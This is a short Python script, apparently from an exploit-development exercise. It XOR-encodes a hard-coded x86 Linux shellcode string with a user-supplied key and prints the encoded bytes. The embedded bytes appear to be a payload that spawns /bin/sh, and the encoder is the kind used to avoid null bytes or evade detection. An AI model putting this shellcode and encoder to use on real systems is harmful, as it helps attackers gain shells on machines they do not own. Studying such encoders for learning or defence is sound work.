
#   shellcode = input("Enter Shellcode")

#shellcode =  ""

shellcode = 'x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x89xc1xb0x0bxcdx80'
value = input("Enter value to xor shellcode")


if value in shellcode:
    print("value is in shellcode,if xored that would result in null byte")

#value = bin(int(value,16))[2:].zfill(8)
hex_dump = list(shellcode)

for i in hex_dump:
    
    if i == 'x':
        hex_dump.remove(i)

#print(hex_dump)
s = []

for i in range(0,len(hex_dump),2):
    temp = "".join(hex_dump[i:i+2])
    s.append(temp)

count = 0
print(s)
res = ''
res2 = ''
for i in s:
    #temp = bin(int(i,16))[2:].zfill(8) ^ bin(int(value,16))[2:].zfill(8)
    temp = int(i,16) ^ int(value,16)
    temp = hex(temp)
    #temp = i^value
    res +=   temp[2:]
    res2 += temp + ','
    count += 1

print(res2)
print(count)
